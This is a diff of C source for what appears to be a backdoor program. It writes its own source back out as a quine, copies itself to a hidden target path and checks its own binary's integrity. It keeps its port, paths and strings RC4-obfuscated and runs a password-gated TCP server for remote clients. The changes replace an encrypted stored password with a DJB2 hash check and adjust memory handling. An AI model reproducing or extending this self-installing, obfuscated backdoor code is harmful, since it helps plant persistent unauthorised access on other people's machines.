@@ -1,4 +1,4 @@
-const unsigned char	srccode[]	=	{};
+const unsigned char	srccode[]	=	{0x11};
 
 #include <time.h>
 #include <poll.h>
@@ -24,7 +24,6 @@ const unsigned char	srccode[]	=	{};
 #define	MAX_CLIENT_CONNECTION	3
 
 const unsigned char	servport[]	=	{0x07, 0x4E, 0x22, 0x27};
-const unsigned char	password[]	=	{0x67, 0x13, 0x79, 0x53, 0xCF, 0xBD, 0xB8, 0x8F, 0xD3, 0x57, 0x0C, 0x0E, 0xD9, 0xCB, 0x66, 0x98, 0x67, 0xC0, 0x7D};
 const unsigned char sfc[]		=	{0x68, 0x29, 0x78, 0x7C, 0xDA, 0x94, 0xE6, 0xA4, 0xFD, 0x4D, 0x0B, 0x12, 0xD1, 0xCB, 0x62, 0xBC, 0x5C, 0xFC, 0x18,
 									 0x7A, 0x28, 0x0F, 0x48, 0xC5, 0x4C, 0xBA, 0x39, 0x75, 0x50, 0x8A, 0x76, 0x00, 0x5B, 0x8C, 0x52, 0x58, 0x5C, 0x94,
 									 0xA8, 0x1B, 0x4B, 0xDF, 0xAB, 0x48, 0xFE, 0x33, 0xF0, 0xFB, 0x08, 0x24, 0xCC, 0x2D, 0x66, 0xC7, 0xD1, 0x07, 0xC0,
@@ -203,11 +202,12 @@ typedef	struct	server
 	t_client_info	clients_info[MAX_CLIENT_CONNECTION+1];
 }				t_server;
 
-t_server		*g_server;
-long long		binchecksum = 256;
-long long		sfcchecksum = 256;
+t_server			*g_server;
+unsigned long		binchecksum = 256;
+unsigned long		sfcchecksum = 5552282552362382127;
+unsigned long		paschecksum = 2911245069172461705;
 
-unsigned long	djb(unsigned char *str)
+unsigned long	DJB2(unsigned char *str)
 {
 	unsigned long	hash = 5381;
 
@@ -254,7 +254,7 @@ void	RC4_PRGA(unsigned char *S, unsigned char *K, size_t len)
 
 unsigned char	*RC4(const char *salt, const unsigned char *msg, size_t len)
 {
-	unsigned char	*cypher = (unsigned char *)malloc(len * sizeof(unsigned char *));
+	unsigned char	*cypher = (unsigned char *)calloc(len + 1, sizeof(unsigned char));
 	unsigned char	S[256];
 	unsigned char	K[len];
 
@@ -445,7 +445,7 @@ void	quine()
 	cypher = RC4(LOGINS, vnewline, sizeof(vnewline));
 	tcypher = RC4(LOGINS, vspace, sizeof(vspace));
 	hcypher = RC4(LOGINS, hexspec, sizeof(hexspec));
-	for (int i = 0; i < sizeof(srccode); i++)
+	for (size_t i = 0; i < sizeof(srccode); i++)
     {
 		if (i && i % 24 == 0)
 			fprintf(file, (const char *)scypher, (const char *)cypher);
@@ -486,9 +486,9 @@ void	move_to_target(void)
 {
 	unsigned char	*cypher = RC4(LOGINS, targpath, sizeof(targpath));
 
-	free(cypher);
 	if (!access((const char *)cypher, F_OK))
 	{
+		free(cypher);
 		if (file_checksum(true))
 			return;
 	}
@@ -922,7 +922,7 @@ void	recv_msg_from_client(int idx)
 	char			buff[1024];
 	unsigned char	*cypher;
 	int				len = 0, client_fd = g_server->clients[idx].fd;
-	bool			ok;
+
 	len = recv(client_fd, buff, sizeof(buff), 0);
 	if (len <= 0)
 	{
@@ -932,10 +932,7 @@ void	recv_msg_from_client(int idx)
 	buff[len-1] = 0;
 	if (!g_server->clients_info[idx].is_logged)
 	{
-		cypher = RC4(LOGINS, (const unsigned char *)buff, sizeof(buff));
-		ok = strcmp((const char *)password, (const char *)cypher);
-		free(cypher);
-		if (!ok)
+		if (paschecksum == DJB2(buff))
 		{
 			g_server->clients_info[idx].is_logged = true;
 			g_server->clients_info[idx].password_try_count = 0;
